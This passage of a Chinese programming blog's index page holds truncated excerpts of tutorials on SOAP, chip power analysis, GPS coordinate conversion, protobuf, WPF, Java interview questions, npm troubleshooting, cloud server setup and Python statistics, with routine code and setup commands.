Web service一般就是用SOAP协议通过HTTP来调用它，其实他就是一个WSDL文档，客户都可以阅读WSDL文档来用这个Web service。客户根据WSDL描述文档，会生成一个SOAP请求消息。Web service都是放在Web服务器 (如IIS) 后面的，客户生成的SOAP请求会被嵌入在一个HTTP POST请求中，发送到Web服务器来。Web服务器再把这些请求转发给Web service请求处理器。请求处理器的作用在于，解析收到的SOAP请求，调用Web service，然后再生成相应的SOAP应答。Web服务器得到SOAP应答后，会再通过HTTP应答的方式把它送回到客户端。
SOAP简单的理解，就是这样的一个开放协议SOAP=RPC+HTTP+XML：采用HTTP作为底层通讯协议；RPC作为远程调用途径，ＸＭＬ作为数据传送的格式，允许服务提供者和服务客户经过防火墙在INTERNET进行通讯交互。
摘自 w3school：SOAP 实例
在下面的例子中：一个 GetStockPrice 请求被发送到了服务器，此请求有一个 StockName 参数，而在响应中则会返回一个 Price 参数，此功能的命名空间被定义在此地址中： http://www.example.org/stock
SOAP请求
POST /InStock HTTP/1.1 Host: www.example.org Content-Type: application/soap+xml; charset=utf-8 Content-Length: nnn &lt;?
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/bd2a68f36ab8ccf2716359ceca8adff6/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bb2b0c9a05da549173a9e292f30d399b/" rel="bookmark">
			PTPX功耗分析笔记——跑出功耗报告
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		从芯片设计到芯片量产的过程中功耗分析是必不可少的环节，在流片前进行功耗分析可以大致估计芯片在各应用场景中的功耗，可以提前做好功耗的优化，达到我们的预期功耗目标。但毕竟不是实际芯片的测量功耗，与实际芯片实际功耗还是不同的。而回片后的功耗测量则是实际的芯片功耗，与预估功耗会有一定的差别。流片前的功耗分析十分重要，有助于我们提前做好芯片的优化，避免无效投入和资源消耗。而流片前的功耗分析能检查出在不同的工作模式下或者工作场景下是否存在不必要的功耗，比如时钟该关的模块是否关闭，不该工作的模块是否没有工作，可以做到芯片设计的合理性检查。
功耗分析分为综合后的功耗分析（简称pre功耗分析）和PR后的功耗分析（简称post功耗分析）。pre功耗分析是直接用综合后的网表和sdf文件跑出波形文件（这里用的是fsdb波形文件），进行功耗分析。post的功耗分析用的网表是经过布局布线、插入时钟树等相关操作后的网表和sdf文件跑出波形文件（这里用的是fsdb波形文件）来进行功耗分析，且在PR过程中可能会引入新的库文件，在post功耗分析时需要将新的库文件加入功耗分析的库里面。
不论是pre功耗分析还是post功耗分析，个人认为功耗分析的能力分为三种级别：（1）根据输入文件能跑出正确的功耗；（2）能对跑出的功耗进行正确合理与否的分析；（3）能根据功耗报告提出相应的功耗优化措施。这里的笔记是关于如何跑出功耗报告，关于分析和优化建议后面会用其它笔记记录。
这里记录的功耗分析是使用ptpx进行的，进行功耗分析主要分为以下几个步骤：（1）设置功耗分析模型，总共包括time_based和averaged两个功耗分析模型；（2）读取库文件和网表文件并将它们link起来；（3）设置input transition和annotate parasitics；（4）读取波形文件；（5）进行功耗分析。进行功耗分析的模板在功耗分析工具的教程里就有，如用ptpx进行功耗分析的步骤介绍就在PT的目录下能找到。虽然能找到，但比较简单，可能在实际使用中还有所修改增补，下面简单给出一个，仅为方便自己以后翻看笔记并进行修改完善，如有错误和欠缺的，请大家慷慨指出和补充。
1 跑出功耗数据 第一步：设置功耗分析模型，这里是固定格式，注：这里的averaged可以根据需求换成time_based
# set the power analysis mode
set power_enable_analysis TRUE
set power_analysis_mode averaged
第二步：读取网表和库文件，设置current_design，将它们link起来，注：关于库文件的设置可以单独放在一个文件里，在这个script中直接source 放库的文件，放库的文件可以参考综合时对综合库的文件进行放置。
# read and link the gate level netlist
set search_path "../src/hdl/gate ../src/lob/snps . "
set link_library "* core_type.db"
#source ptpx_setup_lib.tcl
read_verilog design.vg
current_design design_top
link
第三步：读取时序约束文件
# read sdc and set transition time or annotate parasitics
read_sdc ../../design.sdc
#read_parasitics ../src/annotate/mac.spef.gz
read_sdf -analysis_type on_chip_variation design_top.sdf
第四步：检查、更新、报告时序
# check update or report the timing
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/bb2b0c9a05da549173a9e292f30d399b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e13e2a4192a4afa4eb19393527b6d71c/" rel="bookmark">
			gps经纬度换算，WGS-84-＞GCJ02-＞BD-09
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在经纬度换算前，我们先了解一下常用的坐标种类有哪些： 1、大地坐标系统 WGS-84 用来表述地球上点的位置的一种地区坐标系统。它采用一个十分近似于地球自然形状的参考椭球作为描述和推算地面点位置和相互关系的基准面。一个大地坐标系统必须明确定义其三个坐标轴的方向和其中心的位置。通常人们用旋转椭球的短轴与某一规定的起始子午面分别平行干地球某时刻的平均自转轴和相应的真起始子午面来确定坐标轴的方向。若使参考椭球中心与地球平均质心重合，则定义和建立了地心大地坐标系。它是航天与远程武器和空间科学中各种定位测控测轨的依据。若椭球表面与一个或几个国家的局部大地水准面吻合最好，则建立了一个国家或区域的局部大地坐标系。大地坐标系中点的位置是以其大地坐标表示的，大地坐标均以椭球面的法线来定义。其中，过某点的椭球面法线与椭球赤道面的交角为大地纬度；包含该法线和大地子午面与起始大地子午面的二面角为该点的大地经度；沿法线至椭球面的距离为该点的大地高。大地纬度、大地经度和大地高分别用大写英文字母B、L、H表示。
国内的互联网公司，都不会使用GPS坐标，因为这不符合国家政策。所以大家都会使用GCJ-02坐标系。
2、火星坐标系统 GCJ-02 国家保密插件，也叫做加密插件或者加偏或者SM模组，其实就是对真实坐标系统进行人为的加偏处理，按照几行代码的算法，将真实的坐标加密成虚假的坐标，而这个加偏并不是线性的加偏，所以各地的偏移情况都会有所不同。而加密后的坐标也常被人称为火星坐标系统。
目前使用火星坐标系的地图商:
腾讯搜搜地图搜狐搜狗地图阿里云地图高德MapABC地图灵图51ditu地图 所有的电子地图所有的导航设备，都需要加入国家保密插件。第一步，地图公司测绘地图，测绘完成后，送 到国家测绘局，将真实坐标的电子地图，加密成“火星坐标”，这样的地图才是可以出版和发布的，然后才可以让GPS公司处理。第二步，所有的GPS公司，只要需要汽车导航的，需要用到导航电子地图的，统统需要在软件中加入国家保密算法，将COM口读出来的真实的坐标信号，加密转换成国家要求的保密的坐标，这样，GPS导航仪和导航电子地图就可以完全匹配，GPS也就可以正常工作。
国内互联网公司，都必须使用GCJ-02坐标系。
3、百度坐标系统 BD-09 百度坐标对火星坐标系进行了一次加密,形成了百度坐标系.
目前使用百度坐标系的地图商:
百度Baidu地图 少部分公司会在GCJ-02的基础上再进行一次加密，但这样的坐标不通用，只适于特定公司的地图
坐标的获取： 我们通过GPS模块来测量出当前位置的经纬度信息，使用的模块如图：
通过电脑的串口调试助手可查看GPS模块收到的信息，该模块收到的信息符合NMEA协议，由于本文章只需要经纬度信息，所以就简单对其中一条数据进行讲解，如：
GGA（Global Positioning System Fix Data）GPS定位信息 $GPGGA,&lt;1&gt;,&lt;2&gt;,&lt;3&gt;,&lt;4&gt;,&lt;5&gt;,&lt;6&gt;,&lt;7&gt;,&lt;8&gt;,&lt;9&gt;,M,&lt;10&gt;,M,&lt;11&gt;,&lt;12&gt;*hh&lt;CR&gt;&lt;LF&gt;
&lt;1&gt; UTC时间，hhmmss（时分秒）格式，和北京时间差8个小时。
&lt;2&gt; 纬度ddmm.mmmm（度分）格式（前面的0也将被传输）
&lt;3&gt; 纬度半球N（北半球）或S（南半球）
&lt;4&gt; 经度dddmm.mmmm（度分）格式（前面的0也将被传输）
&lt;5&gt; 经度半球E（东经）或W（西经）
&lt;6&gt; GPS状态：0=未定位，1=单点定位，2=SBAS差分定位，4=RTK固定解，5=RTK浮点解，6=惯导定位
&lt;7&gt; 正在使用解算位置的卫星数量（00~12）（前面的0也将被传输）
&lt;8&gt; HDOP水平精度因子（0.5~99.9）
&lt;9&gt; 海拔高度（-9999.9~99999.9）
&lt;10&gt; 地球椭球面相对大地水准面的高度
&lt;11&gt; 差分时间（从最近一次接收到差分信号开始的秒数，如果不是差分定位将为空）
&lt;12&gt; 差分站ID号0000~1023（前面的0也将被传输，如果不是差分定位将为空）
其中的经度就是10403.514810E
其中的纬度就是3043.506913N
这里提供一个使用python来读取串口中GPS模块收到数据的代码
# -*- coding: UTF-8 -*- # 请看下面代码 import serial # port就是电脑连接GPS模块的串口名，可通过电脑设备管理器查看 # baudrate参数代表模块的波特率，文章展示的这一款模块的波特率默认为38400 ser = serial.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e13e2a4192a4afa4eb19393527b6d71c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d48fbdee2e8738a0a81b8185c2a0079f/" rel="bookmark">
			proto文件详解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、message介绍 message：protobuf中定义一个消息类型是通过关键字message字段指定的。消息就算需要传输的数据格式的定义。message关键字类似于C++中的class，Java中的Class，go中的struct
例如：
message User{ string username=1; int32 age=2; } 在消息中承载的数据分别对应于每一个字段。
其中每个字段都有一个名字和一种类型。
二、字段规则 字段作用required消息体中必填字段，不设置会导致编解码异常。一般不填就认为是必填字段了optional消息体中可选字段。生成的是对应的指针repeated消息体中可重复字段，重复的值的顺序会被保留，在go中重复的会被定义为切片 例子：
定义一个结构
message User{ string username=1; int32 age=2; optional string password=3; // 生成的是指针 repeated string address=4; // 生产的是切片 } 生成一下执行protoc --go_out=./ .\user.proto
生成下面的文件
type User struct { state protoimpl.MessageState sizeCache protoimpl.SizeCache unknownFields protoimpl.UnknownFields Username string `protobuf:"bytes,1,opt,name=username,proto3" json:"username,omitempty"` Age int32 `prtobuf:"varint,2,opt,name=age,proto3" json:"age,omitempty"` Password *string `protobuf:"bytes,3,opt,name=password,proto3,oneof" json:"password,omiyempty"` Address []string `protobuf:"bytes,4,rep,name=address,proto3" json:"address,omitempty"` } 可以看到Address变成了一个切片
三、字段映射 .proto TypeNotesC++ TypePython TypeGo Typedoubledoublefloatfloat64floatfloatfloatfloat32int32使用变长编码，对于负值的效率很低，如果你的域有 可能有负值，请使用sint64替代int32intint32uint32使用变长编码uint32int/longuint32uint64使用变长编码uint64int/longuint64sint32使用变长编码，这些编码在负值时比int32高效的多int32intint32sint64使用变长编码，有符号的整型值。编码时比通常的 int64高效。int64int/longint64fixed32总是4个字节，如果数值总是比总是比228大的话，这 个类型会比uint32高效。uint32intuint32fixed64总是8个字节，如果数值总是比总是比256大的话，这 个类型会比uint64高效。uint64int/longuint64sfixed32总是4个字节int32intint32sfixed32总是4个字节int32intint32sfixed64总是8个字节int64int/longint64boolboolboolboolstring一个字符串必须是UTF-8编码或者7-bit ASCII编码的文 本。stringstr/unicodestringbytes可能包含任意顺序的字节数据。stringstr[]byte 四、默认值 protobuf3删除了protobuf2中用来设置默认值的default关键字，取而代之的是protobuf3为各类型定义的默认值，也就是约定的默认值，如下表：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d48fbdee2e8738a0a81b8185c2a0079f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e497a345607188d0878536b0dd1a7121/" rel="bookmark">
			WPF教程（三）--事件Event调用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、WPF应用程序的关闭 WPF应用程序的关闭只有在应用程序的 Shutdown 方法被调用时，应用程序才停止运行。 ShutDown 是隐式或显式发生，可以通过指定 ShutdownMode 的属性值来进行设置。
对ShutdownMode选项的更改，可以直接在App.xaml中更改，如下代码。
&lt;Application x:Class="WpfApp1.App" xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation" xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml" StartupUri="MainWindow.xaml" ShutdownMode="OnExplicitShutdown" &gt; &lt;Application.Resources&gt; &lt;/Application.Resources&gt; &lt;/Application&gt; 1.在代码文件（App.xaml.cs）中修改ShutdownMode选项，但必须注意这个设置要写在app.Run()方法之前 ，如下代码。
app.ShutdownMode = ShutdownMode.OnExplicitShutdown; app.Run(win); 在应用程序中添加事件的方式有如下三种。
&lt;Application x:Class="WpfApp1.App" xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation" xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml" StartupUri="MainWindow.xaml" ShutdownMode="OnExplicitShutdown" Activated="Application_Activated" Exit="Application_Exit"&gt; &lt;Application.Resources&gt; &lt;/Application.Resources&gt; &lt;/Application&gt; 3、在App.xaml.cs文件的代码如下：
第一种方式--属性界面事件录入(类似Winform事件)：
using System; using System.Collections.Generic; using System.Configuration; using System.Data; using System.Linq; using System.Threading.Tasks; using System.Windows; namespace WpfApp1 { /// &lt;summary&gt; /// App.xaml 的交互逻辑 /// &lt;/summary&gt; public partial class App : Application { private void Application_Activated(object sender, EventArgs e) { } private void Application_Exit(object sender, ExitEventArgs e) { } } } 4.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e497a345607188d0878536b0dd1a7121/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1196cc1e858a9b08ec21f5304cde1175/" rel="bookmark">
			Knife4j常用注解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
关于Knife4j的常用注解：
@Api：
在项目中添加spring-boot-starter-validation依赖项：
今天的分享希望对各位有所帮助​编辑
关于Knife4j的常用注解： @Api： 添加在控制器类上，通过此注解的tags属性可配置模块名称，可以在每个模块名称之前添加数字，则API文档会根据此名称（名称前面的数字）升序排列，例如：
@Api(tags = "01. 相册管理模块")
@ApiOperation：添加在处理请求的方法上，通过此注解的value属性可配置业务名称，例如：
@ApiOperation("添加相册")
@ApiOperationSupport：添加在处理请求的方法上，通过此注解的order属性可配置各业务的排序，最终将按照order属性的值（int类型）升序排列，例如：
@ApiOperationSupport(order = 100)
@ApiModelProperty：添加在POJO类型的属性上，通过此注解的value属性可配置请求参数的描述文本，通过此注解的required属性可配置是否必须提交此参数（注意：此配置并不具备检查功能），通过此注解的example属性可以配置示例值，例如：
@ApiModelProperty(value = "相册名称", required = true)
@ApiImplicitParam：添加在处理请求的方法上，通过此注解的name属性表示你需要配置方法的哪个请求参数，通过此注解的value属性配置请求参数的描述文本，通过此注解的required属性可配置是否必须提交此参数，通过此注解的dataType属性配置请求参数的数据类型，通过此注解的example属性可以配置示例值，例如：
@ApiImplicitParam(name = "id", value = "相册ID", required = true, dataType = "long")
@ApiImplicitParams：添加在处理请求的方法上，当存在多个请求参数的说明是通过@ApiImplicitParam进行配置时，应该将多个@ApiImplicitParam配置作为当前注解的参数值，例如：
@ApiImplicitParams({
@ApiImplicitParam(name = "id", value = "相册ID", required = true, dataType = "long"), @ApiImplicitParam(name = "username", value = "用户名", required = true) })
去除响应结果中的null 当需要“去除响应时为null的数据”时，可以在对应的属性上添加@JsonInclude注解进行配置，当注解属性取值为NON_NULL时，表示“不为null时，JSON结果中将包含此属性”，例如：
@Data public class JsonResult implements Serializable {
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1196cc1e858a9b08ec21f5304cde1175/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4243aed41889abda641080109ba6268a/" rel="bookmark">
			【Matlab】提取excel中的数据画折线图
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1. 前言 在日常数据分析时，将数据保存为xlsx的格式进行存储，本文利用xlsread函数对excel数据进行提取，并利用其数据进行二维图像的绘制。
2. excel中数据内容 3. 代码 %1代表sheet1 pwd = xlsread('C:\Users\xxx\Desktop\excel测试数据.xlsx', 1); %其中1:end代表行，1和2代表列 plot(pwd(1:end, 1), pwd(1:end, 2)); 4. 效果 希望各位读者细心阅读本文，一定会有所收获。
本人能力有限，若有错误，请评论区留言，及时改正，最后别忘了点赞、收藏及关注博主，后期会更新更多相关的文章哦。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/216d42538be8ed10a8b410a22ab03d79/" rel="bookmark">
			C# 实现 Web 打印插件
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言
最近，客户有个需求过来，Web端无预览打印，美其名曰：快捷打印。
当时第一反应就是找插件，拿来主义永远不过时。找了一圈发现，免费的有限制，没限制的需要收费（LODOP真的好用）。
说来就是一个简单的无预览打印，收费的诸多功能都无用武之地，总的来说性价比很低，所以就打算自己琢磨着写一个算了。刚开始总是纠结在Web端去实现直接打印，打印是实现了，结果是服务端的，客户端只能一脸懵。
后来（准备妥协了），安装了一些收费的插件发现，都需要先安装一个客户端程序，灵光乍现，解决方案这不就出来了。
思路：Web端调用客户端程序，让客户端程序去实现打印。
实现：Web端通过WebSocket将Html发送给客户端，客户端（Winform）监听消息，接收处理后再打印。
客户端（Winform）打印实现方式：
1、Html转PDF，然后打印PDF（暂时需要用到三方包）
2、Html转图片，然后通过PrintDocument打印图片
3、通过WebBrowser实现打印
按照上面的思路再去写代码，就会简单很多。
Web端的代码就不多说了，一个简单的WebSocket通信。
客户端程序（Winform）
1、监听Web端的WebSocket消息
这里有用到三方包：Fleck，开箱即用，非常方便。
1 /// &lt;summary&gt; 2 /// ConnAndListen 3 /// &lt;/summary&gt; 4 public static void ConnAndListen() 5 { 7 // 监听本地 45000端口 8 var server = new WebSocketServer($"ws://127.0.0.1:45000"); 9 server.Start(socket =&gt; 10 { 11 socket.OnOpen = () =&gt; 12 { 13 // 连接成功 14 socket.Send("socket通讯已连接"); 15 }; 16 socket.OnClose = () =&gt; 17 { 18 // 关闭连接 19 socket.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/216d42538be8ed10a8b410a22ab03d79/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2c13a632d1764c747dad599cf9ad969e/" rel="bookmark">
			npm install 卡住 不动弹
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		npm install时如果卡住，不动弹，可以试试以下几种方式。
设置注册中心，使用淘宝注册中心。 这种主要解决因为网络问题引起的下载失败，npm config set registry https://registry.npmmirror.com，设置完后使用npm config get可以查看设置结果，根据官方网站的通知淘宝镜像已经更换为npmjs.org 镜像。 删除 node_modules文件夹，执行 npm install 我们都知道，npm install安装的包都在node_modules，删除node_modules后，可防止因为一个包下载失败引起的二次下载失败。 删除package-lock.json文件 package-lock.json文件会锁定版本，有时因为本地nodejs版本与锁定文件中版本不匹配导致下载失败，同时还要删除node_modules文件夹。 node-sass版本与本地nodejs版本不匹配 查看package.json中node-sass的版本与本地的nodejs版本是否匹配，在node-sass官方网站，上边有依赖表，如果不匹配，可考虑使用nvm调整nodejs版本
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b8ba72fc65d9bee7ae6eae0051ad1889/" rel="bookmark">
			【小沐学C&#43;&#43;】C&#43;&#43;实现日志功能：log4cplus（Win10&#43;VS2017）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		🎈C++实现日志功能：简单实现及第三方库汇总🎈
🎈C++实现日志功能：log4c（Win10+VS2017）🎈
🎈C++实现日志功能：log4cplus（Win10+VS2017）🎈
文章目录 1、log4cplus开源库简介2、基本元素3、使用步骤4、测试示例例子1：最简单的例子。例子2：ConsoleAppender。例子3：ConsoleAppender+SimpleLayout。例子4：ConsoleAppender+PatternLayout。例子5：ConsoleAppender+TTCCLayout。例子6：FileAppender。例子7：FileAppender+PatternLayout。例子8：RollingFileAppender+PatternLayout。例子9：DailyRollingFileAppender+PatternLayout。例子10：PropertyConfigurator例子11：SocketAppender 后续 1、log4cplus开源库简介 https://sourceforge.net/projects/log4cplus/
https://github.com/log4cplus/log4cplus
log4cplus is a simple to use C++ logging API providing thread-safe, flexible, and arbitrarily granular control over log management and configuration. It is modelled after the Java log4j API.log4cplus是一个易于使用的C ++ 日志记录API，log4cplus具有灵活、强大、使用简单、多线程安全的特点。通过将信息划分优先级使其可以面向程序调试、运行、测试、和维护等全生命周期；你可以选择将信息输出到屏幕、文件、甚至是远程服务器；通过指定策略对日志进行定期备份等等。Last Update: 2021-08-09Last Version: 2.0.7 ( 2021-08-09 ) 2、基本元素 Layout：布局器，控制输出消息的格式。log4cplus提供了三种类型的Layouts，
分别是SimpleLayout、PatternLayout、和TTCCLayout。Appender：挂接器，与布局器紧密配合，将特定格式的消息输出到所挂接的设备终端(如控制台，文件)。Logger：记录器，保存并跟踪对象日志信息变更的实体，当你需要对一个对象进行记录时，就需要生成一个logger。 3、使用步骤 实例化一个appender对象实例化一个layout对象将layout对象绑定(attach)到appender对象实例化一个logger对象,调用静态函数：log4cplus::Logger::getInstance(“logger_name”)将appender对象绑定(attach)到logger对象，如省略此步骤，标准输出（屏幕）appender对象会绑定到logger设置logger的优先级，如省略此步骤，各种有限级的消息都将被记录。
日志输出级别：ALL &lt; TRACE &lt; DEBUG &lt; INFO &lt; WARN &lt; ERROR &lt; FATAL &lt; OFF 4、测试示例 以下例子基于log4cplus2.0.7进行编写和测试。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b8ba72fc65d9bee7ae6eae0051ad1889/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4dc24c841dba547fcbffb2b080b09145/" rel="bookmark">
			Oracle Apex社区教程：PLSQL常见的类型格式转换
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Oracle APEX论坛,Oracle APEX教程,Oracle APEX社区,Oracle APEX配置,Oracle APEX安装教程,Oracle APEX开发,Oracle APEX兴趣小组
​
PL/SQL类型格式转换
在oracle PL/SQL 开发中,格式转换是很常见,也用的很多的;
1: 字符转数字 TO_NUMBER(char ) 字符转换到数字类型
​编辑
常见就上面这用;但是要注意,参数里的字符串必须是一个可以转换的 !,否则 To_number就会报错
往往我们会写一个函数作为它的升级版
CREATE OR REPLACE FUNCTION cux_to_number
(x_var IN VARCHAR2) RETURN NUMBER
AS vn_return NUMBER;
BEGIN
begin
vn_return := to_number(x_var);
exception –失败时候返回空值
when others then
vn_return := null;
end;
RETURN(vn_return);
END;
2: TO_DATE(char[,’format’]) 字符转换到日期类型,格式说明符：要与前边要转换的字符串的格式要相同才能转换（匹配问题：格式和位数）。
SELECT
EMPNO,
ENAME,
TO_CHAR( HIREDATE, 'YYYY"年"MM"月"DD' ) -- 日期轉字符串
FROM
emp;
​编辑 ​编辑
3TO_CHAR(date[,’format_model'[,nlsparams]]),将 数字,时间等转换成字符串
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4dc24c841dba547fcbffb2b080b09145/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/53568a3cf2aa0d649ae3fe58a3951321/" rel="bookmark">
			【面试】Java高频面试题（2023最新版）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 一、java基础1、JDK 和 JRE 有什么区别？2、== 和 equals 的区别是什么？3、final 在 java 中有什么作用？4、java 中的 Math.round(-1.5) 等于多少？5、String 属于基础的数据类型吗？6、String str="i"与 String str=new String(“i”)一样吗？7、如何将字符串反转？8、String 类的常用方法都有那些？9、new String("a") + new String("b") 会创建几个对象？10、如何将字符串反转？ 二、java集合三、多线程四、JVM五、JavaIO、BIO、NIO、AIO、Netty面试题六、Java异常面试题七、设计模式面试题八、Spring面试题九、 Spring MVC面试题十、Spring Boot面试题十一、Spring Cloud面试题十二、Redis面试题十三、MyBatis面试题十四、MySQL面试题十五、TCP、UDP、Socket、HTTP面试题十六、Nginx面试题十七、ElasticSearch面试题十八、kafka面试题十九、RabbitMQ面试题二十、Dubbo面试题二十一、ZooKeeper面试题二十二、Netty面试题二十三、Tomcat面试题二十四、Linux面试题二十五、互联网相关面试题二十六、互联网安全面试题 一、java基础 1、JDK 和 JRE 有什么区别？ JDK（Java Development Kit），Java开发工具包
JRE（Java Runtime Environment），Java运行环境
JDK中包含JRE，JDK中有一个名为jre的目录，里面包含两个文件夹bin和lib，bin就是JVM，lib
就是JVM工作所需要的类库。
2、== 和 equals 的区别是什么？ 对于基本类型，== 比较的是值；
对于引用类型，==比较的是地址；
equals不能用于基本类型的比较；
如果没有重写equals，equals就相当于 ==；
如果重写了equals方法，equals比较的是对象的内容；
3、final 在 java 中有什么作用？ （1）用来修饰一个引用
如果引用为基本数据类型，则该引用为常量，该值无法修改；
如果引用为引用数据类型，比如对象、数组，则该对象、数组本身可以修改，但指向该对象或数组的地址的引用不能修改。
如果引用时类的成员变量，则必须当场赋值，否则编译会报错。
（2）用来修饰一个方法
当使用final修饰方法时，这个方法将成为最终方法，无法被子类重写。但是，该方法仍然可以被继承。
（3）用来修饰类
当用final修改类时，该类成为最终类，无法被继承。
比如常用的String类就是最终类。
4、java 中的 Math.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/53568a3cf2aa0d649ae3fe58a3951321/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9460bf2ec2c62a38b9d3e43308af1b68/" rel="bookmark">
			7.1 PowerBI系列之DAX函数专题-日期表与事实表关联问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一些知识 重点：日期格式和日期时间格式关联容易造成计算结果不对，即使在数据视图调整了日期格式
实例 1 新建日期表 calendar = calendar(“2016/01/01”,“2018/12/31”)
2 将calendar表的date列和订单表的订单日期关联
3 订单表的订单日期是包含时分秒的数据，此时和calendar中的date列关联，会出现大量数据无法关联的情况（统计值为空的行），即使我们在数据视图下降订单日期调整为date格式，去掉时分秒，数据计算还是不正确，说明表关系建模的时候是用的原始日期时间数据做的关联，能关联上的数据只是具体某一天的0点0分0秒
4 解决方法：在powerquery中将订单日期处理为只包含年月日的格式，见订单表2
订单表1
订单表2
结果
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/72bb45d1b1f3ab30bee7457504e58c71/" rel="bookmark">
			谷歌 Google Cloud 安装 NodeJS服务环境
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 1. 安装 `wget`2. 安装 Node2.1 下载安装包2.2 安装包解压2.3 3 安装全局包并创建软链接 3. 安装 `git` 创建实例略过，点击 SSH 按钮， 在浏览器中打开SSH客户端
注： 本文基于 CentOS 9服务器操作系统
为了方便后面工具插件的顺利安装，切换到 root 用户：
[cmc888@localhost ~]$ sudo -i 输入设置密码的命令：
[root@localhost ~]$ passwd 此时输入的密码不会显示，连续输入两次即可：
Changing password for user root. New password: Retype new password: 1. 安装 wget [root@localhost ~]# yum install wget CentOS Stream 9 - BaseOS 3.4 MB/s | 6.1 MB 00:01 CentOS Stream 9 - AppStream 2.9 MB/s | 16 MB 00:05 CentOS Stream 9 - Extras packages 13 kB/s | 11 kB 00:00 Google Compute Engine 3.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/72bb45d1b1f3ab30bee7457504e58c71/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ff375c80c54c3b2da6f1b874d16d4cc0/" rel="bookmark">
			Python统计学：配对样本t检验~均值差的检验
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		配对样本 t检验 用于两个不同条件下，对同一对象进行测量所得的两个样本均值的区别。
比如吃药前和吃药后体温是否有变化，大鱼钩和小鱼钩钓的鱼的体长是否有差异等。
配对样本是什么？
配对样本需要满足两个基本条件：
1. 样本间存在某种相关性或相互依赖关系，或者同一对象；
2. 配对样本间的差异是变量，变量的选择取决于研究目的。
比如要研究不同药物对高血压的影响，那么需要将参与者分为两组，一组接受药物A，一组接受药物B。
但是如果两组参与者的年龄、性别、体重等因素存在很大差异，那么就很难判断药物A和药物B的差异是否真正反映出各自的治疗效果。
为了解决这个问题，可以把每一位年龄相近、性别相同、体重相近的参与者都被配对在一起，然后再将每一对参与者分别随机分配到药物A组和药物B组，这样就可以消除年龄、性别、体重等因素对结果的影响。
我们举的这个例子则比较简单，检验吃药前后体温是否有差异，也即检验同一对象前后的变化。
提出假设
原假设：体温差为0，吃药前后的体温没有差异
备择假设：体温差不为0，吃药前后的体温有差异
导入数据：
data = {'person':['A','B','C','D','E','A','B','C','D','E'], 'medicine'['before','before','before','before','before','after','after','after','after','after'], 'body_temperature':[36.2,36.2,35.3,36.1,36.1,36.8,36.1,36.8,37.1,36.9]} # 转为DataFrame格式 paired_test_data = pd.DataFrame(data,columns=['person','medicine','body_temperature']) print(paired_test_data) 计算差值：
# 服药前后的样本均值 before = paired_test_data.query('medicine == "before"')["body_temperature"] after = paired_test_data.query('medicine == "after"')["body_temperature"] # 转化为数组型 before = np.array(before) after = np.array(after) # 计算差值 diff = after - before diff 代码详解：
query()用于从DataFrame中选择符合特定条件的行。
query()[]结合起来表示从DataFrame中选择符合特定条件的行，并提取指定列的数据。中括号内是列名。
np.array()把数据转为数组格式。
计算t值和p值：
